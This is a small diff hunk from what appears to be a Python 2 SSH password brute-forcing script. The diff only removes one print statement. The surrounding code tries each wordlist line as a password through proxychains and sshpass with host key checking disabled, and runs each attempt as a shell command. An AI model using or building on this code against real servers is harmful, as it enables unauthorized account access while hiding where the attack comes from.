@@ -128,7 +128,6 @@ def main():
 					print '[*] Ip changed !'
 				print 'We\' re trying with: ' + line
 				var = 'proxychains sshpass -p ' + line[:-1] + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
-				print var
 				os.system(var)
 				c += 1
 
